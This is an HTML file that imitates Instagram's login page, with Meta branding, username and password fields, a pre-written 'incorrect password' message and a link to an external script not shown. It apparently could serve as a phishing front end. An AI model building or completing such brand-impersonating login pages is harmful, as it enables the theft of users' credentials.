<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <link rel="stylesheet" href="./style.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>
<body>
  <div class="container">


    <div class="top">
     <div class="top-left">
      <img class="op1" src="./screnshoot/Picsa-removebg-preview.png" alt="">
        <img class="op2" src="./screnshoot/screenshot1.png" alt="">
     </div>

     <div class="top-right">
       <div class="box-first">
       <div class="box-first-one">
        <img src="./instaji_second.png" alt="">
       </div>
        
       <div class="box-first-second">
         <input id="pname" type="text" placeholder="Phone number, username or email address">

         <input id="pass" type="password" placeholder="Password">
       </div>

        
        <div class="box-first-third">
        <button id="logo" class="log_in">Log in</button>
         <div class="loader">
          ok
         </div>
        </div>

         
        <div class="box-first-forth">
         <hr><span>OR</span><hr>
        </div>

        <div class="box-first-fifthe">
           <div class="fb">
            <a href="#"><i class="fa-brands fa-square-facebook"></i>Log in with Facebook</a>
           </div>
 
           <div class="mess">
            <span>Sorry, your password was incorrect. Please double-check your password.</span>
           </div>

           <div class="forrget-pass">
             <a href="#">Forgotten your password?</a>
           </div>
        </div>
       </div>

       <div class="box-second">
        <span>Don't have an account?<a href="">Sign up</a></span>
       </div>

       <div class="box-third">
         <span>Get the app.</span>
       </div>

       <div class="box-forth">
        <a href=""><img class="micro" src="./microsoft.png" alt=""></a>

        <a href=""><img class="play" src="./google_play.png" alt=""></a>
       </div>
     </div>
    </div>





    <div class="bottom">
      <div class="meta-about">
        <span>Meta</span>
        <span>About</span>
        <span>Blog</span>
        <span>Jobs</span>
        <span>Help</span>
        <span>API</span>
        <span>Privacy</span>
        <span>Terms</span>
        <span>Locations</span>
        <span>Instagram Lite</span>
        <span>Threads</span>
       <span> Contact uploading and non-users</span>
        <span>Meta Verified</span>
    </div>
  
    <div class="meta-2">
      <div class="lang">
       <select data-placeholder="Choose a Language...">
          <option value="Afrikaans">Afrikaans</option>
          <option value="Albanian">Albanian</option>
          <option value="Arabic">Arabic</option>
          <option value="Armenian">Armenian</option>
          <option value="Basque">Basque</option>
          <option value="Bengali">Bengali</option>
          <option value="Bulgarian">Bulgarian</option>
          <option value="Catalan">Catalan</option>
          <option value="Cambodian">Cambodian</option>
          <option value="Chinese (Mandarin)">Chinese (Mandarin)</option>
          <option value="Croatian">Croatian</option>
          <option value="Czech">Czech</option>
          <option value="Danish">Danish</option>
          <option value="Dutch">Dutch</option>
          <option selected value="English">English</option>
          <option value="Estonian">Estonian</option>
          <option value="Fiji">Fiji</option>
          <option value="Finnish">Finnish</option>
          <option value="French">French</option>
          <option value="Georgian">Georgian</option>
          <option value="German">German</option>
          <option value="Greek">Greek</option>
          <option value="Gujarati">Gujarati</option>
          <option value="Hebrew">Hebrew</option>
          <option value="Hindi">Hindi</option>
          <option value="Hungarian">Hungarian</option>
          <option value="Icelandic">Icelandic</option>
          <option value="Indonesian">Indonesian</option>
          <option value="Irish">Irish</option>
          <option value="Italian">Italian</option>
          <option value="Japanese">Japanese</option>
          <option value="Javanese">Javanese</option>
          <option value="Korean">Korean</option>
          <option value="Latin">Latin</option>
          <option value="Latvian">Latvian</option>
          <option value="Lithuanian">Lithuanian</option>
          <option value="Macedonian">Macedonian</option>
          <option value="Malay">Malay</option>
          <option value="Malayalam">Malayalam</option>
          <option value="Maltese">Maltese</option>
          <option value="Maori">Maori</option>
          <option value="Marathi">Marathi</option>
          <option value="Mongolian">Mongolian</option>
          <option value="Nepali">Nepali</option>
          <option value="Norwegian">Norwegian</option>
          <option value="Persian">Persian</option>
          <option value="Polish">Polish</option>
          <option value="Portuguese">Portuguese</option>
          <option value="Punjabi">Punjabi</option>
          <option value="Quechua">Quechua</option>
          <option value="Romanian">Romanian</option>
          <option value="Russian">Russian</option>
          <option value="Samoan">Samoan</option>
          <option value="Serbian">Serbian</option>
          <option value="Slovak">Slovak</option>
          <option value="Slovenian">Slovenian</option>
          <option value="Spanish">Spanish</option>
          <option value="Swahili">Swahili</option>
          <option value="Swedish ">Swedish </option>
          <option value="Tamil">Tamil</option>
          <option value="Tatar">Tatar</option>
          <option value="Telugu">Telugu</option>
          <option value="Thai">Thai</option>
          <option value="Tibetan">Tibetan</option>
          <option value="Tonga">Tonga</option>
          <option value="Turkish">Turkish</option>
          <option value="Ukrainian">Ukrainian</option>
          <option value="Urdu">Urdu</option>
          <option value="Uzbek">Uzbek</option>
          <option value="Vietnamese">Vietnamese</option>
          <option value="Welsh">Welsh</option>
          <option value="Xhosa">Xhosa</option>
        </select>
      </div>
  
      <span>© 2025 Instagram from Meta</span>
  
      <!-- <div class="copy">
      <span>© 2024 Instagram from Meta</span>
      </div> -->
    </div> 
    </div>
  </div>
  
  <script src="./jingle.js"></script>
</body>
</html>